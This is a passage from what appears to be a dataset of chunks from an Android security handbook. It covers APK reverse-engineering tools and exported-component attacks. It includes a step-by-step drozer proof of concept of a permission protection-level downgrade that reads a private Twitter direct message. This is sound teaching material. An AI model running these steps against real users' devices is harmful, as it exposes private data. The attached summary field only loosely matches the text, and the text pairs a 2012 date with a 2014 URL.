(or some other app store).\nRetrieving APK Files\nIf the application you are targeting is on a device that you are able to get ADB access to, you can use this access\nto retrieve the APK file. Sometimes, finding the package name of a target application can be tricky. For example,\nlook at the twitter application. The following approach lists all installed packages on the device and looks\nspecifically for the word twitter:\n$ adb shell pm list packages | grep twitter\npackage:com.twitter.android\nThis package was easy to find because it had a predictable word in the package name. However, this may not\nalways be the case. For example, to find the package that is started when you click the Terminal Emulator\nlauncher icon, run your search in drozer using the app.packages.list command with a filter for this\napplication’s label.\ndz> run app.package.list -f \"Terminal Emulator\"\njackpal.androidterm (Terminal Emulator)\nThis application would not have been found using the ADB method. To pull this application off the device you\nfirst need to find the path where the APK is stored, which you can do using ADB as follows:\n$ adb shell pm path jackpal.androidterm\npackage:/data/app/jackpal.androidterm-2.apk\nOr using drozer’s app.package.info module and observing the APK Path line in the output:\ndz> run app.package.info -a jackpal.androidterm\nPackage: jackpal.androidterm\nApplication Label: Terminal Emulator\nProcess Name: jackpal.androidterm\nVersion: 1.0.59\nData Directory: /data/data/jackpal.androidterm\nAPK Path: /data/app/jackpal.androidterm-2.apk\nUID: 10215\nGID: [3003, 1015, 1023, 1028]\nShared Libraries: null\nShared User ID: null\nUses Permissions:\n- android.permission.INTERNET\n- android.permission.WRITE_EXTERNAL_STORAGE\n- android.permission.ACCESS_SUPERUSER\n- android.permission.WAKE_LOCK\n- android.permission.READ_EXTERNAL_STORAGE\nDefines Permissions:\n- jackpal.androidterm.permission.RUN_SCRIPT\n- jackpal.androidterm.permission.APPEND_TO_PATH\n- jackpal.androidterm.permission.PREPEND_TO_PATH\nTo reverse engineer applications from the Play Store, you would need to install them onto a device you own and\nthen use the preceding method. However, sometimes the application you are targeting is not available in the\nPlay Store from your country. You can overcome this issue by using sites to which you provide the package\nname or Play Store link to your target application, and they provide a direct APK download. Two such sites are\nhttp://apkleecher.com/\nhttp://apps.evozi.com/apk-downloader/\nViewing Manifests\nA big part of understanding an Android application is obtaining and reviewing the AndroidManifest.xml file\nassociated with the package. A number of tools are available to do this, and this section discusses three of them.\naapt\nThe Android Asset Packaging Tool (aapt) that comes with the Android SDK can be used to dump binary resource\nfiles included in an APK. To dump the manifest of the drozer agent using aapt, perform the following command:\n$ aapt dump xmltree /path/to/agent.apk AndroidManifest.xml\nN: android=http://schemas.android.com/apk/res/android\nE: manifest (line=2)\nA: android:versionCode(0x0101021b)=(type 0x10)0x5\nA: android:versionName(0x0101021c)=\"2.3.4\" (Raw: \"2.3.4\")\nA: package=\"com.mwr.dz\" (Raw: \"com.mwr.dz\")\nE: uses-sdk (line=7)\nA: android:minSdkVersion(0x0101020c)=(type 0x10)0x7\nA: android:targetSdkVersion(0x01010270)=(type 0x10)0x12\nE: uses-permission (line=11)\nA: android:name(0x01010003)=\"android.permission.INTERNET\" (Raw:\n\"android.permission.INTERNET\")\nE: application (line=13)\nA: android:theme(0x01010000)=@0x7f070001\nA: android:label(0x01010001)=@0x7f060000\nA: android:icon(0x01010002)=@0x7f020009\nA: android:debuggable(0x0101000f)=(type 0x12)0xffffffff\n...\nAnother shorter way to dump resources in addition to the manifest is:\n$ aapt l -a /path/to/agent.apk\nYou will notice that aapt does not produce XML output, which makes it hard to use inside XML viewing\napplications. Instead, it produces text that specifies E: for an XML entity and A: for an attribute. Using aapt can\nbe useful when you have limited tools available.\nAXMLPrinter2\nThis tool parses the Android binary XML format directly. Therefore, APK files need to be unzipped first in order\nto obtain the AndroidManifest.xml to pass as an argument to this tool. You can download it from\nhttps://code.google.com/p/android4me/downloads/list. Here is an example of using it to parse and display the\ndrozer agent manifest:\n$ unzip agent.apk\nArchive: agent.apk\ninflating: res/drawable/ic_stat_connecting.xml\ninflating: res/layout/activity_about.xml\ninflating: res/layout/activity_endpoint.xml\ninflating: res/layout/activity_endpoint_settings.xml\ninflating: AndroidManifest.xml\n...\n$ java -jar AXMLPrinter2.jar AndroidManifest.xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest\nxmlns:android=\"http://schemas.android.com/apk/res/android\"\nandroid:versionCode=\"5\"\nandroid:versionName=\"2.3.4\"\npackage=\"com.mwr.dz\"\n>\n<uses-sdk\nandroid:minSdkVersion=\"7\"\nandroid:targetSdkVersion=\"18\"\n>\n</uses-sdk>\n<uses-permission\nandroid:name=\"android.permission.INTERNET\"\n>\n</uses-permission>\n<application\nandroid:theme=\"@7F070001\"\nandroid:label=\"@7F060000\"\nandroid:icon=\"@7F020009\"\nandroid:debuggable=\"true\"\n...\nVIEWING XML FILES\nDirect manifest output into a file (using >) and then view it in an application that displays XML files in a\nuser-friendly manner. Popular web browsers such as Google Chrome and Mozilla Firefox make excellent\nXML viewers. They allow you to expand and collapse entities for easy navigation of the manifest.\ndrozer\nA module in drozer named app.package.manifest can parse manifest files and display them to screen. Using\ndrozer to retrieve a manifest differs from other tools in that it can only parse the manifests of installed\napplications. The argument that is passed to this module is the package’s name whose manifest you would like\ndisplayed. An example of this is shown here:\ndz> run app.package.manifest com.mwr.dz\n<manifest versionCode=\"5\"\nversionName=\"2.3.4\"\npackage=\"com.mwr.dz\">\n<uses-sdk minSdkVersion=\"7\"\ntargetSdkVersion=\"18\">\n</uses-sdk>\n<uses-permission name=\"android.permission.INTERNET\">\n</uses-permission>\n<application theme=\"@2131165185\"\nlabel=\"@2131099648\"\nicon=\"@2130837513\"\ndebuggable=\"true\"\n...\nOUTPUTTING TO A FILE\ndrozer offers a variety of shell semantics. For instance, you can create a file containing the output of any\nmodule by appending > /path/to/save/file to the command.\nDisassembling DEX Bytecode\nLike all other compiled and interpreted code, the Dalvik bytecode contained within DEX files can be\ndisassembled into low-level human-readable assembly.\nDexdump\nDexdump is a tool that comes with the Android SDK, and you can find it in any of the subdirectories in the\nbuild-tools folder of the SDK directory. To disassemble DEX files into Dalvik instructions, use the following\ncommand:\n$ ./dexdump -d /path/to/classes.dex\n...\n#3 : (in Landroid/support/v4/app/FragmentState$1;)\nname : 'newArray'\ntype : '(I)[Ljava/lang/Object;'\naccess : 0x1041 (PUBLIC BRIDGE SYNTHETIC)\ncode -\nregisters : 3\nins : 2\nouts : 2\ninsns size : 5 16-bit code units\n057050: |[057050]\nandroid.support.v4.app.FragmentState.1.newArray:(I)[Ljava/lang/Object;\n057060: 6e20 ea03 2100 |0000: invoke-virtual {v1,\nv2},\nLandroid/support/v4/app/FragmentState$1;.newArray:(I)[Landroid/support/v4/a\npp/FragmentState; // method@03ea\n057066: 0c00 |0003: move-result-object v0\n057068: 1100 |0004: return-object v0\ncatches : (none)\npositions :\n0x0000 line=137\nlocals :\n0x0000 - 0x0005 reg=1 this Landroid/support/v4/app/FragmentState$1;\n0x0000 - 0x0005 reg=2 x0 I\nsource_file_idx : 1152 (Fragment.java)\n...\nThe output produced by this tool is quite hard to read and almost in the most rudimentary state possible.\nSmali and Baksmali\nBaksmali is a disassembler that makes use of Jasmin syntax (see http://jasmin.sourceforge.net/). It accepts\nDEX and APK files as arguments and disassembles each class in the DEX file to its own file, which is in a much\nmore readable format. This, in turn, makes analysis of this code much more manageable. To disassemble the\nDEX file inside an APK, perform the following command:\n$ java -jar baksmali-x.x.x.jar /path/to/app.apk\nIf no output directory is specified via the -o flag then by default all class files will be put in a directory named\nout.\nCombined with the tool named smali, this toolkit is very powerful. Smali is an assembler that compiles a\ndirectory filled with classes in disassembled format back to a single DEX file. You can use the following\ncommand:\n$ java -jar smali-x.x.x.jar -o classes.dex out/\nGo to https://code.google.com/p/smali/ to download both of these tools.\nIDA\nIDA is a very popular disassembler used by reverse engineers all around the world. The power of IDA is its rich\nuser interface and vast support for many different CPU architectures and interpreters. It is a commercial tool\nsold by Hex-Rays and is available at https://www.hex-rays.com/.\nIDA is able to understand the DEX format and provides a user interface with a “graph-view” for understanding\nthe flow of application logic in an intuitive way. Figure 6.12 shows an example of the graph view provided when\ndisassembling a DEX file with IDA.\nFigure 6.12 Graph view showing the disassembly of a DEX file in IDA.\nDecompiling DEX Bytecode\nReading and understanding disassembled code is hard work. The more natural way to review an application\nwould be to obtain the source code. Dalvik bytecode contained within a DEX file is an interpreted language that\ncan be translated back to something that resembles the original source code. This can be performed by tools\nnatively on the DEX file or by first converting the DEX file to standard Java CLASS files.\nDex2jar and JD-GUI\nDex2jar converts Android DEX files to Java Class files. This is useful because many tools are already available\nthat can decompile Java bytecode back to source code. It is open source and you can download it from\nhttps://code.google.com/p/dex2jar/. It has grown from just a decompiler into a tool suite that performs many\ndifferent tasks. However, the focus in this section is on converting Android DEX files to Java files. Here is an\nexample of performing this operation with the d2j-dex2jar utility:\n$ ./d2j-dex2jar.sh /path/to/agent.apk -o /output/to/agent.jar\ndex2jar /path/to/agent.apk -> /output/to/agent.jar\nThe produced JAR file can now be decompiled back into Java source code using a number of available tools. The\nmost popular choice for decompilation and viewing is JD-GUI. Figure 6.13 shows the converted JAR file open in\nJD-GUI.\nFigure 6.13 Viewing decompiled application code in JD-GUI\nJD-GUI can be downloaded from http://jd.benow.ca/ for all major platforms.\nJEB\nJEB is a dedicated Android application decompiler that is sold by PNF Software. It comes in two flavors:\nJEB Automation—This command-line decompiler enables you to write scripts and perform bulk analysis\nof multiple files quicker.\nJEB Full—This includes the command-line decompiler as well as a GUI that allows for easy navigation of\nthe decompiled application. The look and feel of the user interface is very similar to IDA by Hex-Rays.\nFigure 6.14 shows an example of decompiling an application in the JEB interface.\nFigure 6.14 Viewing decompiled application code in JEB\nJEB works directly on the Android package’s DEX file and does not use any intermediate steps that convert the\nDEX to a JAR file like other tools. Subtle differences in the Dalvik and Java bytecode sometimes cause other\ntools to fail to decompile the code. This is what JEB overcomes by performing this decompilation natively on the\nDEX file. For the casual Android application hacker, this failure may not be a problem. However, if accuracy and\nquality decompilation is what you are after, JEB offers it at a price. Go to http://www.android-decompiler.com/\nfor more information about JEB.\nDecompiling Optimized DEX Bytecode\nDEX files for system applications aren’t usually stored inside their APK. Rather, the code is pre-optimized and\nstored as an ODEX file. This file is the result of many optimizations that cause it to become reliant on the exact\nversion of the Dalvik VM in use and other framework dependencies. This means that ODEX files cannot be\ndecompiled in the same way as DEX files. In fact, they first need to be converted back to DEX files that have\nthose optimizations and framework dependencies removed.\nTo perform this conversion from ODEX to DEX you can use smali and baksmali. You download the entire\n/system/frameworks directory of the device on which the optimization took place, which you can do using ADB:\n$ mkdir framework\n$ adb pull /system/framework framework/\npull: building file list...\n...\npull: /system/framework/framework2.odex -> framework/framework2.odex\npull: /system/framework/framework2.jar -> framework/framework2.jar\npull: /system/framework/framework.odex -> framework/framework.odex\npull: /system/framework/framework.jar -> framework/framework.jar\npull: /system/framework/framework-res.apk -> framework/framework-res.apk\npull: /system/framework/ext.odex -> framework/ext.odex\npull: /system/framework/ext.jar -> framework/ext.jar\npull: /system/framework/core.odex -> framework/core.odex\npull: /system/framework/core.jar -> framework/core.jar\npull: /system/framework/core-libart.odex -> framework/core-libart.odex\npull: /system/framework/core-libart.jar -> framework/core-libart.jar\npull: /system/framework/core-junit.odex -> framework/core-junit.odex\npull: /system/framework/core-junit.jar -> framework/core-junit.jar\n...\n123 files pulled. 0 files skipped.\n1470 KB/s (56841549 bytes in 37.738s)\nThe target ODEX file can then be disassembled into an assembly-like format that uses the provided framework\ndependencies and then compiled back into a normal DEX file. For instance, try this on the Settings.odex file\nthat belongs to the settings application.\n$ adb pull /system/priv-app/Settings.odex\n2079 KB/s (1557496 bytes in 0.731s)\nNOTE\nRemember that system applications in Android 4.4 (KitKat) onward have to be placed in /system/priv-app.\nThis is why we pulled it from this directory and not the /system/app folder where system applications were\nstored on older versions of Android.\nYou can use the following command to convert the ODEX to smali. By default, it stores the disassembled code in\nthe out/ directory.\n$ java -jar baksmali-x.x.x.jar -a 19 -x Settings.odex -d framework/\nNow the disassembled code can be assembled again into a DEX file.\n$ java -jar smali-x.x.x.jar -a 19 -o Settings.dex out/\nThe -a parameter given to smali and baksmali is the API version used by the applications. After you have\ngenerated a DEX file you can use your favorite decompilation and viewing tools to analyze the source code.\nYou can find the API version in use programmatically or by observing which Android version is running on your\ndevice and then finding the corresponding API version number. Table 6.5 shows this mapping for all versions\navailable at the time of writing.\nTable 6.5 Mapping Android Versions to Corresponding API Levels\nPLATFORM VERSION API LEVEL VERSION CODE\nAndroid 5.0 21 LOLLIPOP\nAndroid 4.4W 20 KITKAT_WATCH\nAndroid 4.4 19 KITKAT\nAndroid 4.3 18 JELLY_BEAN_MR2\nAndroid 4.2, 4.2.2 17 JELLY_BEAN_MR1\nAndroid 4.1, 4.1.1 16 JELLY_BEAN\nAndroid 4.0.3, 4.0.4 15 ICE_CREAM_SANDWICH_MR1\nAndroid 4.0, 4.0.1, 4.0.2 14 ICE_CREAM_SANDWICH\nAndroid 3.2 13 HONEYCOMB_MR2\nAndroid 3.1.x 12 HONEYCOMB_MR1\nAndroid 3.0.x 11 HONEYCOMB\nAndroid 2.3.3, 2.3.4 10 GINGERBREAD_MR1\nAndroid 2.3, 2.3.1, 2.3.2 9 GINGERBREAD\nAndroid 2.2.x 8 FROYO\nAndroid 2.1.x 7 ECLAIR_MR1\nAndroid 2.0.1 6 ECLAIR_0_1\nAndroid 2.0 5 ECLAIR\nAndroid 1.6 4 DONUT\nAndroid 1.5 3 CUPCAKE\nAndroid 1.1 2 BASE_1_1\nAndroid 1.0 1 BASE\nhttp://developer.android.com/guide/topics/manifest/uses-sdk-element.html#ApiLevels\nThis table is going to be useful as a reference for future chapters that will discuss vulnerabilities that were fixed\nin certain API versions.\nReversing Native Code\nThe Linux shared object (.so) files that can be included as part of an Android application may also require\nreverse engineering. This may be a scenario where source code is not available and the code being executed by\nthe native component needs to be understood. Typically, native components run compiled machine code for the\nARM architecture; however, Android now runs on multiple other architectures as well. At the time of writing,\nthe supported architectures also included x86 and MIPS.\nDisassembly and the understanding of native code in this way is a topic that is beyond the scope of this book. A\nnumber of tools are available to disassemble native code, and IDA is one of the most popular choices for this\ntask.\nIn addition to just disassembling native code, it is possible to decompile it with the Hex-Rays Decompiler. Hex-\nRays provides a full decompiler from ARM machine code to pseudo-C output; it is at https://www.hex-\nrays.com/products/decompiler/ with a hefty price tag attached to it. Multiple open-source attempts have been\nmade at creating a decompiler for ARM machine code, but to date they have not been as successful as\ncommercial counterparts.\nAdditional Tools\nThis section lists other tools that may be of interest to an Android reverse engineer.\nApktool\nYou can use Apktool to reverse-engineer an entire Android package back to a workable form for modification.\nThis includes converting all resources, including AndroidManifest.xml, back to (nearly) their original source as\nwell as disassembling the DEX file back to smali code. To do this, perform the following command:\n$ java -jar apktool.jar d /path/to/app.apk output\nI: Baksmaling...\nI: Loading resource table...\nI: Loaded.\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: /home/tyrone/apktool/framework/1.apk\nI: Loaded.\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Done.\nI: Copying assets and libs...\nYou can compile a fully working APK file again after making any necessary modifications to the source by using\nthe following command:\n$ java -jar apktool.jar b output/ new.apk\nI: Checking whether sources has changed...\nI: Smaling...\nI: Checking whether resources has changed...\nI: Building resources...\nI: Copying libs...\nI: Building apk file...\nNOTE\nTo build an application using apktool, the SDK tool aapt needs to be on your PATH.\nApktool is an ideal tool to use if you need to modify any aspect of an application that you do not have the source\nfor. Download it for free from https://code.google.com/p/android-apktool/.\nJadx\nJadx is an open source DEX decompiler project that is in a working state and looks evermore promising each\nversion. It contains command-line tools as well as a GUI to browse decompiled code. Source code and\ndownloads are at https://github.com/skylot/jadx. Figure 6.15 shows the jadx-gui tool that has decompiled an\nAndroid application.\nFigure 6.15 Viewing decompiled application code in Jadx-gui\nJAD\nJAD is another popular free tool that allows for the decompilation of Java Class files back to source files. It does\nnot provide a user interface like JD-GUI does. Unfortunately, it is not in active development anymore and the\nlast release was in 2001. In some cases it has been found to be less reliable than using other similar tools. You\ncan download it from a mirror site at http://varaneckas.com/jad/.\nDealing with ART\nAndroid devices making use of the new Android Runtime (ART) convert DEX files into OAT files at installation\ntime. OAT files are essentially ELF dynamic objects that are run on the device and one would assume that they\nwould have to be treated like native code when reverse engineering them. A tool named oatdump performs a\nsimilar disassembling function for OAT files as dexdump does for DEX files. Explore the options provided by this\ntool if you are interested in disassembling an OAT file. However, similarly to dexdump the output is provided in\nquite a raw manner.\nOne simple fact that can be used is that the APK file of each installed application is still stored on the device.\nThis means that the DEX file of your target application is still accessible in the normal way even when the\nconverted OAT file is being used on the device. Another interesting detail is that every OAT file contains the\noriginal DEX file(s) embedded inside it. Pau Oliva created a script called oat2dex that can extract the DEX file(s)\nfrom within a given OAT file. This script relies on radare2 (see http://www.radare.org/) and can be found at\nhttps://github.com/poliva/random-scripts/blob/master/android/oat2dex.sh. This can be used if the original\nAPK containing the DEX is no longer available. At the time of writing reverse-engineering tools and techniques\nfor OAT files were still in active research by the security community.\nSummary\nAndroid is a unique operating system with some components that would be familiar to those who understand\nthe inner workings of Linux. However, the way in which applications work on Android is completely unique to\nthe platform. The security model provided for Android applications is complex but rich and requires you to have\na thorough understanding before you can analyze applications.\nThe tools available on Android for reverse engineers and hackers are mature and can be used to thoroughly\ninvestigate application behavior and their underlying code. Using these tools it is possible to easily dig in and get\nready to start finding vulnerabilities in applications. This chapter presented all of the fundamental knowledge\nrequired to move on to hacking Android applications and Chapter 7 will give you a kick start in doing just that!",
    "question": "What is the difference between the Android Runtime (ART) and the Dalvik runtime, and how does ART improve application performance and security?",
    "summary": "Android 5.0 introduced the ART runtime, which pre-compiles apps to native code for better performance and battery life, replacing the older Dalvik runtime. While the transition was initially met with mixed results, it marked a significant shift in Android's technical approach to app execution. Additionally, Android's security model relies on code signing and application sandboxes to control access to device resources, but vulnerabilities in the code signing process and system components can be exploited to gain unauthorized access or bypass security restrictions."
  },
  {
    "start": 36,
    "end": 37,
    "text": "CHAPTER 7\nAttacking Android Applications\nWith everything you now know about Android applications and the environment under which they operate, you\nwould be correct in assuming that every developer cannot get everything right. Without a deep technical\nunderstanding of every security mechanism at play, creating an application that has no vulnerabilities is tough\nfor a developer.\nAn attacker who is seeking to find vulnerabilities in an application should consider multiple approaches and\ntesting perspectives. The three high-level components to consider for each application are shown in Figure 7.1\nand discussed in the list that follows.\nApplication container—Various ways may exist to defeat an application’s sandbox and gain access to\napplication data. Attack vectors could include a malicious application that has been installed on a device,\nphysical access to the device, or reviewing the application for other vulnerabilities.\nCommunications—Due to the choice of protocol and encryption implementation, intercepting and gaining\naccess to the data traversing a channel could be possible. Attack vectors could include ARP (Address\nResolution Protocol) poisoning, hosting a malicious wireless network or compromising upstream providers,\nand positioning yourself to intercept and modify network traffic on a larger scale.\nInternet server—A server that a mobile application communicates with may include vulnerabilities. Access\ngained to this server will likely mean the complete compromise of information traversing from connected\nmobile applications.\nFigure 7.1 A high-level overview of various testing perspectives of an Android application\nThis chapter focuses heavily on attacking applications on a device and their communication channels with\nInternet servers. This chapter does not cover vulnerabilities found in Internet servers. Dozens of publications\nhave discussed this vast topic in the past, and it will continue to change. Web service vulnerabilities or other\nAPIs that an application may communicate with are also not covered.\nBefore delving into attacking applications, we need to explore some application security model quirks that will\nbe used as the basis for attack later in the chapter.\nExposing Security Model Quirks\nThe Android security model is full of little quirks that are beneficial to know about when attempting to find\nvulnerabilities in applications. This section covers the especially important quirks for application testers to\nconsider.\nInteracting with Application Components\nApplications on a device can interact with components that are exported. However, defining the conditions that\nmake a component “exported” is not simple and can differ depending on the version of Android in use.\nComponents can end up becoming exported to other applications running on the same device in three ways: by\nthe default export behavior, by being explicitly exported, and by being implicitly exported, as discussed next.\nDefault Export Behavior\nTable 7.1 shows the default export behavior of each application component on different Android API versions.\nTable 7.1 The Default Export Behavior of Each Application Component Across API Versions\nAPPLICATION COMPONENT EXPORTED (API < 17) EXPORTED (API >= 17)\nActivity False False\nBroadcast receiver False False\nService False False\nContent provider True False\nIn API version 17, which equates to Android 4.2 Jelly Bean, content providers are no longer exported by default.\nHowever, if the targetSdkVersion of an application is set to 16 or lower, the content provider will still be\nexported by default. You can read more about this security enhancement at http://android-\ndevelopers.blogspot.com/2013/02/security-enhancements-in-jelly-bean.html. This means that if the\ndeclaration of a content provider does not specify an android:exported attribute, its exposure depends on what\nversion of Android the device is running. If it is running on Android 4.2 or above then it will depend on the\ntargetSdkVersion set in the <uses-sdk> element of the manifest. If it is running on a device that is running a\nversion of Android before 4.2, the content provider is exposed. Here is an example of a content provider\nmanifest declaration lacking this explicit attribute:\n<provider android:name=\"com.mahh.app\"\nandroid:authorities=\"com.mahh.content\" />\nExplicitly Exported\nApplication components can be explicitly marked as exported in the application manifest. This is the most\nobvious way to know that a component is exported. The following is an example of an exported broadcast\nreceiver manifest declaration:\n<receiver\nandroid:name=\"com.mahh.receiver\"\nandroid:exported=\"true\" >\n</receiver>\nImplicitly Exported\nAny component that makes use of an <intent-filter> is exported by default. This means that even intents that\naren’t explicitly targeting an application component’s intent filter can still be sent to the component. Here is an\nexample of an activity with an intent filter specified:\n<activity android:name=\"ImageActivity\">\n<intent-filter>\n<action android:name=\"android.intent.action.SEND\"/>\n<category android:name=\"android.intent.category.DEFAULT\"/>\n<data android:mimeType=\"image/*\"/>\n</intent-filter>\n</activity>\nNo android:exported attribute is specified and by default activities are not exported. However, because of the\nintent filter present, this activity is still exported.\nFinding Exported Components\nYou can find exported components of an application by inspecting the application’s manifest for the three\ntechniques mentioned. You can also use drozer from multiple viewpoints. The app.package.attacksurface\nmodule is perfect for getting a high-level view of the exported components of an application. You run this\nmodule against the Android browser as follows:\ndz> run app.package.attacksurface com.android.browser\nAttack Surface:\n6 activities exported\n4 broadcast receivers exported\n1 content providers exported\n0 services exported\nFor a more detailed view of the specific components exported, use the app.<component>.info modules. For\nexample, you can view the broadcast receivers exposed by the Android browser:\ndz> run app.broadcast.info -a com.android.browser\nPackage: com.android.browser\ncom.android.browser.widget.BookmarkThumbnailWidgetProvider\nPermission: null\ncom.android.browser.OpenDownloadReceiver\nPermission: null\ncom.android.browser.AccountsChangedReceiver\nPermission: null\ncom.android.browser.PreloadRequestReceiver\nPermission: com.android.browser.permission.PRELOAD\nFor a more verbose view of any intent filters set on these components that may have caused the component to\nbecome exported, use the -i flag on these modules.\nSupreme User Contexts\nIn Chapter 6, you saw that the Android security model consists of a blend of a traditional UNIX file permission\nenforcement model and custom kernel elements that control the access to assets using permissions. The two\nmost important user contexts that control these security functions are the root and system users.\nWith these user contexts having such powerful privileges on the OS, it is natural to expect that they can exert\ncontrol over installed applications as well. Let us shed some light on one particular fact: The root and system\nusers can interact with application components even when they are not exported. Whether an application\nexports a component in its manifest or not is relevant only when the calling application is another non-system\napplication. Code running as root or system can interact with any component and send intents to them even\nwhen they are not exported in their manifest. This means that an attacker who has gained this level of access to\na device can use it to send intents to components that were never intended to be accessible. Examples of\ninteracting with each application component in this way are explained in the relevant sections under the\n“Attacking Application Components” portion of this chapter.\nApplication developers generally consider components that are not exported in their manifest to be private and\nlimited to internal use by the application. However, the issues that can be uncovered by abusing this level of\naccess is relatively low-risk because an attacker who has gained this level of access is able to do many worse\nthings on the compromised device. Chapter 8 explores these attacks in more depth. To find components that are\nnot exported by an application, you can examine the manifest or use the -u flag on any of the drozer app.\n<component> .info modules.\nTIP\nThe app.package.attacksurface module shows only application components that have been exported in\ntheir manifest. This means that application components that have not been exported and can be attacked\nfrom a privileged user context are not shown in this module’s output.\nPermission Protection Levels\nThe best available protection against an unauthorized application being able to interact with an application\ncomponent is making use of a custom permission with protection level signature. This ensures that only\nanother application that was signed by the same certificate can be granted this permission.\nHowever, on February 12, 2012, Mark Murphy described a scenario where the signature protection level could\nbe bypassed, and documented it at http://commonsware.com/blog/2014/02/12/vulnerabilities-custom-\npermissions.html. He found that Android uses a “first one in wins” mentality in regard to protection levels on\npermissions. This means that the first application to define a permission also sets the permission’s attributes\nregardless of applications that may define the same permission after that. This will be referred to from this\npoint onward as a Protection Level Downgrade Attack. The following is the attack scenario:\n1. An installed malicious application defines a set of known permission names from popular applications with a\nprotection level of normal.\n2. The user then installs a popular application and the OS sees that one of the permissions is already defined.\nThis leads the OS to ignore the protection level of the permission and stick to the known parameters already\ndefined by the malicious application.\n3. The permission that is supposed to be used to protect application components now has a downgraded\nprotection level of normal instead of another more secure value like signature. Even though the permission\nwas defined with a signature protection level, which was defined by the legitimate application, Android does\nnot know any different.\n4. The malicious application can interact with the no-longer protected application components defined with the\ndowngraded permission.\nAs a proof of concept, we perform a practical example of this attack on the Twitter application here. The Twitter\napplication defines a number of permissions, which are bolded:\ndz> run app.package.info -a com.twitter.android\nPackage: com.twitter.android\nApplication Label: Twitter\nProcess Name: com.twitter.android\nVersion: 5.31.0\nData Directory: /data/data/com.twitter.android\nAPK Path: /data/app/com.twitter.android-1.apk\nUID: 10236\nGID: [3003, 1028, 1015]\nShared Libraries: null\nShared User ID: null\nUses Permissions:\n- com.twitter.android.permission.C2D_MESSAGE\n- com.twitter.android.permission.RESTRICTED\n- com.twitter.android.permission.AUTH_APP\n- android.permission.INTERNET\n- android.permission.ACCESS_NETWORK_STATE\n- android.permission.VIBRATE\n- android.permission.READ_PROFILE\n- android.permission.READ_CONTACTS\n- android.permission.RECEIVE_SMS\n- android.permission.GET_ACCOUNTS\n- android.permission.MANAGE_ACCOUNTS\n- android.permission.AUTHENTICATE_ACCOUNTS\n- android.permission.READ_SYNC_SETTINGS\n- android.permission.WRITE_SYNC_SETTINGS\n- android.permission.ACCESS_FINE_LOCATION\n- android.permission.USE_CREDENTIALS\n- android.permission.SYSTEM_ALERT_WINDOW\n- android.permission.WAKE_LOCK\n- android.permission.WRITE_EXTERNAL_STORAGE\n- com.twitter.android.permission.READ_DATA\n- com.google.android.c2dm.permission.RECEIVE\n- com.google.android.providers.gsf.permission.READ_GSERVICES\n- com.twitter.android.permission.MAPS_RECEIVE\n- com.android.launcher.permission.INSTALL_SHORTCUT\n- android.permission.READ_PHONE_STATE\n- com.sonyericsson.home.permission.BROADCAST_BADGE\n- com.sec.android.provider.badge.permission.READ\n- com.sec.android.provider.badge.permission.WRITE\n- android.permission.CAMERA\n- android.permission.ACCESS_WIFI_STATE\n- android.permission.READ_EXTERNAL_STORAGE\nDefines Permissions:\n- com.twitter.android.permission.READ_DATA\n- com.twitter.android.permission.MAPS_RECEIVE\n- com.twitter.android.permission.C2D_MESSAGE\n- com.twitter.android.permission.RESTRICTED\n- com.twitter.android.permission.AUTH_APP\nTo build a drozer agent that requests the defined permissions use the following command:\n$ drozer agent build --permission com.twitter.android.permission\n.READ_DATA\ncom.twitter.android.permission.MAPS_RECEIVE\ncom.twitter.android.permission.C2D_MESSAGE\ncom.twitter.android.permission.RESTRICTED\ncom.twitter.android.permission.AUTH_APP\nDone: /tmp/tmpNIBfbw/agent.apk\nInstalling the newly generated agent and checking logcat reveals that only a single permission was granted: the\ncom.twitter.android.permission.AUTH_APP permission. At this point, interacting with any protected application\ncomponents on the Twitter application correctly results in a permission denial. You can test this on any\npermission-protected application component, but here is a look at the content providers exposed by Twitter:\ndz> run app.provider.info -a com.twitter.android\nPackage: com.twitter.android\nAuthority: com.twitter.android.provider.TwitterProvider\nRead Permission: com.twitter.android.permission.RESTRICTED\nWrite Permission: com.twitter.android.permission.RESTRICTED\nContent Provider: com.twitter.library.provider.TwitterProvider\nMultiprocess Allowed: False\nGrant Uri Permissions: False\nPath Permissions:\nPath: /status_groups_view\nType: PATTERN_PREFIX\nRead Permission: com.twitter.android.permission.READ_DATA\nWrite Permission: null\nAuthority: com.twitter.android.provider.SuggestionsProvider\nRead Permission: com.twitter.android.permission.RESTRICTED\nWrite Permission: com.twitter.android.permission.RESTRICTED\nContent Provider: com.twitter.android.provider.SuggestionsProvider\nMultiprocess Allowed: False\nGrant Uri Permissions: False\nPath Permissions:\nPath: /search_suggest_query\nType: PATTERN_PREFIX\nRead Permission: android.permission.GLOBAL_SEARCH\nWrite Permission: null\nThe com.twitter.android.permission.RESTRICTED permission that protects one of the content providers has the\nprotectionLevel of signature, which is the most stringent that Android has to offer. This means that an\napplication that requests this permission will not have it granted unless the signing certificate matches that of\nthe Twitter application. To see this protection level, use drozer as shown here:\ndz> run information.permissions --permission\ncom.twitter.android.permission.RESTRICTED\nNo description\n2 - signature\nNext, uninstall the Twitter application and compile and install a version of drozer that defines all the\npermissions of the Twitter application with a protection level of normal instead and then also uses these\npermissions:\n$ drozer agent build --define-permission\ncom.twitter.android.permission.READ_DATA normal\ncom.twitter.android.permission.MAPS_RECEIVE normal\ncom.twitter.android.permission.C2D_MESSAGE normal\ncom.twitter.android.permission.RESTRICTED normal --permission\ncom.twitter.android.permission.READ_DATA\ncom.twitter.android.permission.MAPS_RECEIVE\ncom.twitter.android.permission.C2D_MESSAGE\ncom.twitter.android.permission.RESTRICTED\ncom.twitter.android.permission.AUTH_APP\nDone: /tmp/tmpZQugD_/agent.apk\n$ adb install /tmp/tmpZQugD_/agent.apk\n2528 KB/s (653400 bytes in 0.252s)\npkg: /data/local/tmp/agent.apk\nSuccess\nNow, when a user installs Twitter the defined permissions retain their protection level of normal, which allows\nthe exposure of all the components being protected by these permissions. The example queries a Twitter content\nprovider for the most recent Direct Message (DM) sent to the user:\ndz> run app.provider.query content://com.twitter.android.provider\n.TwitterProvider/messages?limit=1&ownerId=536649879 --projection content\n| content |\n| This should be private right? |\nIt is important to note that this is not a vulnerability in the Twitter application but rather shows a broader\nplatform security quirk. More detail on querying content providers is provided later in this chapter. The\nimportant point to take away from this example: Installing a malicious application that defines particular\npermissions prior to a legitimate application being installed that defines the same permissions is one way to\ndefeat the entire permission security model.\nAttacking Application Components\nAttacking another application over the Android IPC system involves finding all the exported components of the\napplication and attempting to use them in a way that was not intended. For activities, broadcast receivers, and\nservices this means you must examine all the code that handles intents 